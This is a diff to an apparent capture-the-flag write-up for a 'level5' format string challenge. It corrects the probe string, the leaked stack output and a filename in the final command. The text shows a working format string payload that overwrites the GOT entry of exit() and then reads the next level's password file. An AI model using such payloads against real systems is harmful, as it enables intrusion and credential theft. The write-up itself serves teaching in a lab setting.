@@ -44,16 +44,16 @@ Now we have the address of `exit()`: `0x08049838` and the address of `o()`: `0x0
 
 We need to print the memory until we reach the address of `exit()`:
 ```
- python -c 'print "aaaa" + " %x" * 10' > /tmp/payload5
+ python -c 'print "AAAA" + " %x" * 10' > /tmp/payload5
  cat /tmp/payload5 | ./level5
- aaaa 200 b7fd1ac0 b7ff37d0 61616161 25207825 78252078 20782520 25207825 78252078 20782520
+ AAAA 200 b7fd1ac0 b7ff37d0 41414141 25207825 78252078 20782520 25207825 78252078 20782520
 ```
-The address of `exit()` is at the 4th position (`61616161`).
+The address of `exit()` is at the 4th position (`41414141`).
 
 
 Our final format string attack:
 ```
 python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit5
-cat /tmp/exploit - | ./level5
+cat /tmp/exploit5 - | ./level5
 cat /home/user/level6/.pass
 ```
